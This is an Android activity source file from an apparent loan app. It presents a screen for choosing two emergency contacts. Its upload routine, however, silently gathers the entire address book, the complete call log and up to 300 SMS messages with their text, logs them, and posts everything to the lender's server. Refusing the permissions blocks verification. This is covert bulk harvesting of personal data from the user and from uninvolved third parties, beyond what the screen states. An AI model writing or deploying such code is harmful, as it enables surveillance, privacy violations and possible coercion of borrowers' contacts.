package com.mofa.loan.activity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.mofa.loan.R;
import com.mofa.loan.pojo.Contact;
import com.mofa.loan.pojo.Contact2;
import com.mofa.loan.pojo.SMS;
import com.mofa.loan.utils.ActionSheetDialog;
import com.mofa.loan.utils.ActionSheetDialog.OnSheetItemClickListener;
import com.mofa.loan.utils.ActionSheetDialog.SheetItemColor;
import com.mofa.loan.utils.AlertDialog;
import com.mofa.loan.utils.BaseActivity;
import com.mofa.loan.utils.Config;
import com.mofa.loan.utils.EditUtils;
import com.mofa.loan.utils.HttpUtils;
import com.mofa.loan.utils.MD5Util;
import com.mofa.loan.utils.PermissionUtils;
import com.mofa.loan.utils.ToastUtil;
import com.mofa.loan.view.MyProgressDialog;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@TargetApi(23)
public class RelationInfo2Activity extends BaseActivity implements
        OnClickListener {

	private LinearLayout llContact1;
	private LinearLayout llPhone1;
	private LinearLayout llRelationship1;
	private LinearLayout llContact2;
	private LinearLayout llPhone2;
	private LinearLayout llRelationship2;
	private TextView tvContact1;
	private TextView tvPhone1;
	private TextView tvRelationship1;
	private TextView tvContact2;
	private TextView tvPhone2;
	private TextView tvRelationship2;
	private Button btnNext;

	private String contact1 = "";
	private String phone1 = "";
	private String relationship1 = "";
	private String contact2 = "";
	private String phone2 = "";
	private String relationship2 = "";

	private String userid;
	private List<Contact> list;
	private List<Contact2> list2;
	private List<SMS> smss;

	private MyProgressDialog dialog;

	private SharedPreferences sp;
	private String json = "";

	private Handler mHandler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			String result = msg.obj.toString();
			Log.i("MOFA", "---RelationInfo---" + result);
			dialog.dismiss();
			switch (msg.what) {
			case Config.CODE_URL_ERROR:
				ToastUtil.showShort(RelationInfo2Activity.this, getResources()
						.getString(R.string.url_error));

				break;
			case Config.CODE_ERROR:
				ToastUtil.showShort(RelationInfo2Activity.this, "system error");
				
				break;
			case Config.CODE_NET_ERROR:
				ToastUtil.showShort(RelationInfo2Activity.this, getResources()
						.getString(R.string.network_error));

				break;
				
			case Config.CODE_CONTACT_FAILED:
				ToastUtil.showShort(RelationInfo2Activity.this,
						"something wrong");
				break;
			case Config.CODE_CONTACT_FAIL:
				ToastUtil.showShort(RelationInfo2Activity.this, "upload wrong");

				break;
			case Config.CODE_CONTACT_SUCCESS:
				Log.i("MOFA", "---RelationInfo---" + "CODE_CONTACT_SUCCESS");
				try {
					String url = Config.GETCONTACT + "&userid=" + userid
							+ "&contact1="
							+ URLEncoder.encode(contact1, "UTF-8")
							+ "&contact2="
							+ URLEncoder.encode(contact2, "UTF-8")
							+ "&guanxi1="
							+ URLEncoder.encode(relationship1, "UTF-8")
							+ "&guanxi2="
							+ URLEncoder.encode(relationship2, "UTF-8")
							+ "&tel1=" + replaceBlank(phone1) + "&tel2="
							+ replaceBlank(phone2) + "&lxr="
							+ MD5Util.md5(userid);
					HttpUtils.doGetAsyn(url, mHandler, Config.GET_CONTACTS);

				} catch (UnsupportedEncodingException e) {
					Log.e("MOFA", e.getMessage());
				}

				break;
			case Config.GET_CONTACTS:
				try {
					JSONObject jsonObject = new JSONObject(result);
					int error = jsonObject.getInt("error");
					if (error == 0) {
						ToastUtil.showShort(
								RelationInfo2Activity.this,
								getResources().getString(
										R.string.bind_contacts_success));

						Editor editor2 = sp.edit();
						editor2.putInt("islianxi", 1);
						editor2.commit();
						int isyhbd = sp.getInt("isyhbd", 0);
						int isshenfen = sp.getInt("isshenfen", 0);
						int isjob = sp.getInt("isjob", 0);
						int isschool = sp.getInt("isschool", 0);
						// int isfacebook = sp.getInt("isfacebook", 0);
						int profession = sp.getInt("profession", 2);
						if (isyhbd == 0) {
							Intent intent = new Intent(RelationInfo2Activity.this,
									BindCardActivity.class);
							startActivity(intent);
						} else if (isshenfen == 0) {
							Intent intent = new Intent(RelationInfo2Activity.this,
									BaseInfo2Activity.class);
							startActivity(intent);
						} else if ((profession == 2 && isjob == 0)
								|| (profession == 1 && isschool == 0)) {
							Intent intent = new Intent(
									RelationInfo2Activity.this,
									WorkInfo3Activity.class);
							startActivity(intent);
							// } else if (profession == 1 && isschool == 0) {
							// Intent intent = new Intent(IDCardActivity.this,
							// StudentInfo2Activity.class);
							// startActivity(intent);
							// }
							// else if (isfacebook == 0) {
							// startActivity(new Intent(IDCardActivity.this,
							// FacebookAcytivity.class));
						} else {
							Intent intent = new Intent(
									RelationInfo2Activity.this,
									IndexActivity.class);
							intent.putExtra("id", 11);
							startActivity(intent);
						}
						finish();
					} else {
						showDialog(jsonObject.getString("msg"));
					}
				} catch (JSONException e) {
					Log.e("MOFA", e.getMessage());
				}
				break;
			default:
				break;
			}
		}
	};

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_relation_info2);
		initview();
		if (Build.VERSION.SDK_INT >= 23) {
			if (this.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
					|| this.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
					|| this.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
				// 申请权限 第二个参数是一个 数组 说明可以同时申请多个权限
				this.requestPermissions(new String[] {
						android.Manifest.permission.READ_CONTACTS,
						android.Manifest.permission.READ_CALL_LOG,
						android.Manifest.permission.READ_SMS },
						PermissionUtils.READ_CONTACT_PERMISSION);
			} else {// 已授权
			}
		} else {
		}
		Log.i("MOFA", "RelationInfo2---onCreate");
	}

	private long timeIn;
	private long timeOut;

	@Override
	public void onStart() {
		super.onStart();
		timeIn = System.currentTimeMillis();
		Log.i("MOFA", "RelationInfo2---onStart:" + timeIn);
	}

	@Override
	public void onStop() {
		super.onStop();
		timeOut = System.currentTimeMillis();
		Log.i("MOFA", "RelationInfo2---onStop:" + timeOut);
		Log.i("MOFA", "RelationInfo2---Show:" + (timeOut - timeIn));
	}

	@Override
	public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions, int[] grantResults) {
		if (grantResults.length > 0
				&& grantResults[0] == PackageManager.PERMISSION_GRANTED
				&& grantResults[1] == PackageManager.PERMISSION_GRANTED
				&& grantResults[2] == PackageManager.PERMISSION_GRANTED) {
			// 权限申请成功
		} else {
			Intent intent = new Intent(RelationInfo2Activity.this,
					IndexActivity.class);
			intent.putExtra("id", 1);
			startActivity(intent);
			finish();
			Log.i("MOFA", "权限拒绝：认证通讯录时权限");
		}
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
	}

	private void initview() {
		dialog = new MyProgressDialog(this, "");
		sp = getSharedPreferences("config", MODE_PRIVATE);
		userid = sp.getString("userid", "");
		int profession = sp.getInt("profession", 0);
		if (profession == 1) {
			ImageView ivProfession = findViewById(R.id.iv_profession);
			ivProfession.setImageResource(R.drawable.unveifiedstudent);
		}
		findViewById(R.id.back).setOnClickListener(this);
		llContact1 = findViewById(R.id.ll_contact1);
		llContact1.setOnClickListener(this);

		llPhone1 = findViewById(R.id.ll_phone1);
		llPhone1.setOnClickListener(this);
		llRelationship1 = findViewById(R.id.ll_relationship1);
		llRelationship1.setOnClickListener(this);
		llContact2 = findViewById(R.id.ll_contact2);
		llContact2.setOnClickListener(this);
		llPhone2 = findViewById(R.id.ll_phone2);
		llPhone2.setOnClickListener(this);
		llRelationship2 = findViewById(R.id.ll_relationship2);
		llRelationship2.setOnClickListener(this);
		tvContact1 = findViewById(R.id.tv_contact1);
		tvPhone1 = findViewById(R.id.tv_phone1);
		tvRelationship1 = findViewById(R.id.tv_relationship1);
		tvContact2 = findViewById(R.id.tv_contact2);
		tvPhone2 = findViewById(R.id.tv_phone2);
		tvRelationship2 = findViewById(R.id.tv_relationship2);
		btnNext = findViewById(R.id.btn_relationship_next);
		btnNext.setOnClickListener(this);
	}

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.back:
			Intent intent = new Intent(RelationInfo2Activity.this,
					IndexActivity.class);
			intent.putExtra("id", 1);
			startActivity(intent);
			finish();
			break;

		case R.id.btn_relationship_next:
			if (TextUtils.isEmpty(contact1)) {
				showDialog(getResources().getString(
						R.string.get_family_members_first));
				return;
			}
			if (TextUtils.isEmpty(contact2)) {
				showDialog(getResources().getString(
						R.string.get_friends_or_colleague));
				return;
			}
			if (TextUtils.isEmpty(phone1)) {
				showDialog(getResources().getString(
						R.string.choose_another_relation1));
				return;
			}
			if (TextUtils.isEmpty(phone2)) {
				showDialog(getResources().getString(
						R.string.choose_another_relation2));
				return;
			}
			dialog.show();
			uploadRelation();
			break;

		case R.id.ll_contact1:
		case R.id.ll_phone1:
		case R.id.ll_relationship1:
			showdialog();
			break;

		case R.id.ll_contact2:
		case R.id.ll_phone2:
		case R.id.ll_relationship2:
			showdialog2();
			break;

		default:
			break;
		}
	}

	private void showdialog2() {
		new ActionSheetDialog(RelationInfo2Activity.this)
				.builder()
				.setCancelable(false)
				.setCanceledOnTouchOutside(false)
				.addSheetItem(getResources().getString(R.string.colleague),
						SheetItemColor.GRAY, new OnSheetItemClickListener() {
							@Override
							public void onClick(int which) {
								relationship2 = getResources().getString(
										R.string.colleague);

								Intent i = new Intent();
								i.setAction(Intent.ACTION_PICK);
								i.setData(ContactsContract.Contacts.CONTENT_URI);
								startActivityForResult(i, 1002);

								// startActivityForResult(new Intent(
								// RelationInfoActivity.this,
								// PhoneNumberActivity.class), 1002);
							}
						})
				.addSheetItem(getResources().getString(R.string.friend),
						SheetItemColor.GRAY, new OnSheetItemClickListener() {
							@Override
							public void onClick(int which) {
								relationship2 = getResources().getString(
										R.string.friend);
								Intent i = new Intent();
								i.setAction(Intent.ACTION_PICK);
								i.setData(ContactsContract.Contacts.CONTENT_URI);
								startActivityForResult(i, 1002);

								// startActivityForResult(new Intent(
								// RelationInfoActivity.this,
								// PhoneNumberActivity.class), 1002);
							}
						})
				.addSheetItem(getResources().getString(R.string.classmate),
						SheetItemColor.GRAY, new OnSheetItemClickListener() {
							@Override
							public void onClick(int which) {
								relationship2 = getResources().getString(
										R.string.classmate);
								Intent i = new Intent();
								i.setAction(Intent.ACTION_PICK);
								i.setData(ContactsContract.Contacts.CONTENT_URI);
								startActivityForResult(i, 1002);

								// startActivityForResult(new Intent(
								// RelationInfoActivity.this,
								// PhoneNumberActivity.class), 1002);
							}
						}).show();
	}

	private void showdialog() {
		new ActionSheetDialog(RelationInfo2Activity.this)
				.builder()
				.setCancelable(false)
				.setCanceledOnTouchOutside(false)
				.addSheetItem(getResources().getString(R.string.parent),
						SheetItemColor.GRAY, new OnSheetItemClickListener() {
							@Override
							public void onClick(int which) {
								relationship1 = getResources().getString(
										R.string.parent);
								// startActivityForResult(new Intent(
								// RelationInfoActivity.this,
								// PhoneNumberActivity.class), 1001);

								Intent i = new Intent();
								i.setAction(Intent.ACTION_PICK);
								i.setData(ContactsContract.Contacts.CONTENT_URI);
								startActivityForResult(i, 1001);
							}
						})
				.addSheetItem(getResources().getString(R.string.spouse),
						SheetItemColor.GRAY, new OnSheetItemClickListener() {
							@Override
							public void onClick(int which) {
								relationship1 = getResources().getString(
										R.string.spouse);
								// startActivityForResult(new Intent(
								// RelationInfoActivity.this,
								// PhoneNumberActivity.class), 1001);

								Intent i = new Intent();
								i.setAction(Intent.ACTION_PICK);
								i.setData(ContactsContract.Contacts.CONTENT_URI);
								startActivityForResult(i, 1001);
							}
						})
				.addSheetItem(getResources().getString(R.string.sister),
						SheetItemColor.GRAY, new OnSheetItemClickListener() {
							@Override
							public void onClick(int which) {
								relationship1 = getResources().getString(
										R.string.sister);
								// startActivityForResult(new Intent(
								// RelationInfoActivity.this,
								// PhoneNumberActivity.class), 1001);

								Intent i = new Intent();
								i.setAction(Intent.ACTION_PICK);
								i.setData(ContactsContract.Contacts.CONTENT_URI);
								startActivityForResult(i, 1001);
							}
						})
				.addSheetItem(getResources().getString(R.string.brother),
						SheetItemColor.GRAY, new OnSheetItemClickListener() {
							@Override
							public void onClick(int which) {
								relationship1 = getResources().getString(
										R.string.brother);
								// startActivityForResult(new Intent(
								// RelationInfoActivity.this,
								// PhoneNumberActivity.class), 1001);

								Intent i = new Intent();
								i.setAction(Intent.ACTION_PICK);
								i.setData(ContactsContract.Contacts.CONTENT_URI);
								startActivityForResult(i, 1001);
							}
						}).show();
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		switch (requestCode) { // resultCode为回传的标记，我在B中回传的是RESULT_OK
		case 1001:
			if (data == null) {
				return;
			}
			Uri contactData = data.getData();
			if (contactData == null) {
				return;
			}
			Cursor cursor = getContentResolver().query(contactData, null, null,
					null, null);
			if (cursor.moveToFirst()) {
				contact1 = cursor
						.getString(cursor
								.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				String hasPhone = cursor
						.getString(cursor
								.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
				String id = cursor.getString(cursor
						.getColumnIndex(ContactsContract.Contacts._ID));
				if (hasPhone.equalsIgnoreCase("1")) {
					hasPhone = "true";
				} else {
					hasPhone = "false";
				}
				if (Boolean.parseBoolean(hasPhone)) {
					Cursor phones = getContentResolver().query(
							ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
							null,
							ContactsContract.CommonDataKinds.Phone.CONTACT_ID
									+ " = " + id, null, null);
					while (phones.moveToNext()) {
						phone1 = phones
								.getString(phones
										.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					}
					phones.close();
				}
			}

			tvContact1.setText(contact1);
			tvPhone1.setText(phone1);
			tvRelationship1.setText(relationship1);

			break;
		case 1002:

			if (!(resultCode == RESULT_OK)) {
				return;
			}
			if (data == null) {
				return;
			}
			Uri uri2 = data.getData();
			if (uri2 == null) {
				return;
			}

			Cursor cursor2 = getContentResolver().query(uri2, null, null, null,
					null);
			if (cursor2.moveToFirst()) {
				contact2 = cursor2
						.getString(cursor2
								.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				String hasPhone = cursor2
						.getString(cursor2
								.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
				String id = cursor2.getString(cursor2
						.getColumnIndex(ContactsContract.Contacts._ID));
				if (hasPhone.equalsIgnoreCase("1")) {
					hasPhone = "true";
				} else {
					hasPhone = "false";
				}
				if (Boolean.parseBoolean(hasPhone)) {
					Cursor phones = getContentResolver().query(
							ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
							null,
							ContactsContract.CommonDataKinds.Phone.CONTACT_ID
									+ " = " + id, null, null);
					while (phones.moveToNext()) {
						phone2 = phones
								.getString(phones
										.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					}
					phones.close();
				}
			}

			tvContact2.setText(contact2);
			tvPhone2.setText(phone2);
			tvRelationship2.setText(relationship2);
			break;
		default:
			break;
		}

	}

	private void showDialog(String Message) {
		new AlertDialog(RelationInfo2Activity.this)
				.builder()
				.setMsg(Message)
				.setNegativeButton(getResources().getString(R.string.OK),
						new OnClickListener() {
							@Override
							public void onClick(View v) {

							}
						}).show();
	}

	private boolean isExit = false;
	private TimerTask timeTask;
	private Timer timer = new Timer();

	@Override
	public void onBackPressed() {
		if (isExit) {
			Intent intent1 = new Intent(RelationInfo2Activity.this,
					IndexActivity.class);
			intent1.putExtra("id", 1);
			startActivity(intent1);
			finish();
		} else {
			isExit = true;
			ToastUtil.showShort(RelationInfo2Activity.this, getResources()
					.getString(R.string.warm_reclick_to_exit_veify));

			timeTask = new TimerTask() {

				@Override
				public void run() {
					isExit = false;
				}
			};
			timer.schedule(timeTask, 3000);
		}
	}

	private void uploadRelation() {
		new Thread() {
			public void run() {
				Log.i("MOFA", "---RelationInfo---" + "进入getContact");
				smss = getSmsInPhone(getContentResolver());
				list = getContacts(getContentResolver());
				list2 = getCallHistoryList2(null, getContentResolver());
				JsonArray array = new JsonArray();
				for (int i = 0; i < list.size(); i++) {
					JsonObject object = new JsonObject();
					try {
						object.addProperty("showName",
								URLEncoder.encode(
										EditUtils.NoSpecialString(list.get(i)
												.getName()), "UTF-8"));
						object.addProperty("phoneNumber", list.get(i)
								.getPhone());
						array.add(object);
					} catch (UnsupportedEncodingException e) {
						Log.e("MOFA", e.getMessage());
					}
				}
				JsonArray array2 = new JsonArray();
				for (int i = 0; i < list2.size(); i++) {
					JsonObject object = new JsonObject();
					object.addProperty("type", list2.get(i).getType());
					object.addProperty("name",
							EditUtils.NoSpecialString(list2.get(i).getName()));
					object.addProperty("number", list2.get(i).getNumber());
					object.addProperty("callDuration", list2.get(i)
							.getCallDuration());
					object.addProperty("callDateStr", list2.get(i)
							.getCallDateStr());
					array2.add(object);
				}
				JsonArray array3 = new JsonArray();
				String content = "";
				for (int i = 0; i < smss.size(); i++) {
					JsonObject object = new JsonObject();
					content = smss.get(i).getContent();
					if (TextUtils.isEmpty(content)) {
						content = "111";
					} else {
						EditUtils.NoSpecialString(content);
					}
					content = content.replace("%", "%25");
					object.addProperty("phone", smss.get(i).getPhone());
					object.addProperty("person", smss.get(i).getPerson());
					object.addProperty("content", content);
					object.addProperty("smstime", smss.get(i).getDate());
					object.addProperty("type", smss.get(i).getType());
					array3.add(object);
				}
				JsonObject obj = new JsonObject();
				obj.addProperty("userid", userid);
				obj.addProperty("we", MD5Util.md5(userid));
				obj.add("contacts", array);
				obj.add("contacts1", array2);
				obj.add("sms", array3);
				json = obj.toString();
				Log.i("MOFA", "---RelationInfo---" + json);
				// 上传联系人json数据
				String url2 = Config.URL
						+ "servlet/current/JBDUserAction?function=OLVshangCost";
				HttpUtils.httpPostJSONAsync(url2, json, mHandler);
				Log.i("MOFA", "SMS:" + smss.size() + ";List:" + list.size()
						+ ";List2:" + list2.size() + ";json:" + json.length());
			}
		}.start();
	}

	/**
	 * 利用系统CallLog获取通话历史记录
	 * 
	 * @return
	 */
	@SuppressLint("SimpleDateFormat")
	public List<Contact2> getCallHistoryList2(Context context,
                                              ContentResolver cr) {
		List<Contact2> list2 = new ArrayList<Contact2>();
		Cursor cs;
		cs = cr.query(CallLog.Calls.CONTENT_URI, // 系统方式获取通讯录存储地址
				new String[] { CallLog.Calls.CACHED_NAME, // 姓名
						CallLog.Calls.NUMBER, // 号码
						CallLog.Calls.TYPE, // 呼入/呼出(2)/未接
						CallLog.Calls.DATE, // 拨打时间
						CallLog.Calls.DURATION // 通话时长
				}, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
		if (cs != null && cs.getCount() > 0) {
			for (cs.moveToFirst(); !cs.isAfterLast(); cs.moveToNext()) {

				Long time = Long.parseLong(cs.getString(3));

				String callName = cs.getString(0);
				callName = callName == null ? "null" : callName;
				String callNumber = cs.getString(1);
				// 通话类型
				int callType = Integer.parseInt(cs.getString(2));
				String callTypeStr = "";
				switch (callType) {
				case CallLog.Calls.INCOMING_TYPE:
					callTypeStr = "call in";
					break;
				case CallLog.Calls.OUTGOING_TYPE:
					callTypeStr = "call out";
					break;
				case CallLog.Calls.MISSED_TYPE:
					callTypeStr = "missed";
					break;
				}
				// 拨打时间
				SimpleDateFormat sdf = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");

				Date callDate = new Date(time);
				String callDateStr = sdf.format(callDate);
				// 通话时长
				int callDuration = Integer.parseInt(cs.getString(4));
				Contact2 contact2 = new Contact2(callTypeStr, callName,
						callNumber, callDuration, callDateStr);
				list2.add(contact2);
			}
		}
		return list2;
	}

	public List<Contact> getContacts(ContentResolver cr) {
		// 联系人的Uri，也就是content://com.android.contacts/contacts
		Uri uri = ContactsContract.Contacts.CONTENT_URI;
		// 指定获取_id和display_name两列数据，display_name即为姓名
		String[] projection = new String[] { ContactsContract.Contacts._ID,
				ContactsContract.Contacts.DISPLAY_NAME };
		// 根据Uri查询相应的ContentProvider，cursor为获取到的数据集
		Cursor cursor = cr.query(uri, projection, null, null, null);
		Contact[] arr = new Contact[cursor.getCount()];
		int i = 0;
		if (cursor != null && cursor.moveToFirst()) {
			do {
				Contact contact = new Contact();
				Long id = cursor.getLong(0);
				// 获取姓名
				String name = cursor.getString(1);
				name = name == null ? "Null" : name;
				name = name.replaceAll("[\"“”]", "-");
				contact.setName(name);
				// 指定获取NUMBER这一列数据
				String[] phoneProjection = new String[] { ContactsContract.CommonDataKinds.Phone.NUMBER };
				// arr[i] = id + " , 姓名：" + name;

				// 根据联系人的ID获取此人的电话号码
				Cursor phonesCusor = cr.query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
						phoneProjection,
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "="
								+ id, null, null);

				// 因为每个联系人可能有多个电话号码，所以需要遍历
				if (phonesCusor != null && phonesCusor.moveToFirst()) {
					String num = "";
					do {
						// String num2 = phonesCusor.getString(0);
						// arr[i] += " , 电话号码：" + num;
						// num += "/" + num;
						num += "/" + phonesCusor.getString(0);
					} while (phonesCusor.moveToNext());
					contact.setPhone(num);
				}
				arr[i] = contact;
				i++;
				if (phonesCusor != null) {
					if (!phonesCusor.isClosed())
						phonesCusor.close();
				}
			} while (cursor.moveToNext());
		}
		if (cursor != null) {
			if (!cursor.isClosed())
				cursor.close();
		}

		return Arrays.asList(arr);
	}

	public List<SMS> getSmsInPhone(ContentResolver cr) {
		List<SMS> smss = new ArrayList<SMS>();

		try {
			Uri uri = Uri.parse("content://sms/");
			String[] projection = new String[] { "_id", "address", "person",
					"body", "date", "type" };
			Cursor cur = cr.query(uri, projection, null, null, "date desc"); // 获取手机内部短信

			if (cur.moveToFirst()) {
				int index_Address = cur.getColumnIndex("address");
				int index_Person = cur.getColumnIndex("person");
				int index_Body = cur.getColumnIndex("body");
				int index_Date = cur.getColumnIndex("date");
				int index_Type = cur.getColumnIndex("type");
				int count = 0;
				do {
					String strAddress = cur.getString(index_Address);
					int intPerson = cur.getInt(index_Person);
					String strbody = cur.getString(index_Body);
					long longDate = cur.getLong(index_Date);
					int intType = cur.getInt(index_Type);

					SimpleDateFormat dateFormat = new SimpleDateFormat(
							"yyyy-MM-dd hh:mm:ss");
					Date d = new Date(longDate);
					String strDate = dateFormat.format(d);

					String strType = "";
					if (intType == 1) {
						strType = "receive";
					} else if (intType == 2) {
						strType = "send";
					} else {
						strType = "none";
					}

					SMS sms = new SMS(strAddress, intPerson, strbody, strDate,
							strType);
					smss.add(sms);
					count++;
					if (count == 300) {
						break;
					}
				} while (cur.moveToNext());

				if (!cur.isClosed()) {
					cur.close();
					cur = null;
				}
			} else {

			} // end if

		} catch (SQLiteException ex) {
			Log.i("MOFA", ex.getMessage());
		}

		return smss;
	}

	public static String replaceBlank(String str) {
		String dest = "";
		if (str != null) {
			Pattern p = Pattern.compile("\\s*|\t|\r|\n|-");
			Matcher m = p.matcher(str);
			dest = m.replaceAll("");
		}
		return dest;
	}

	@Override
	public void processMessage(Message message) {

	}

}
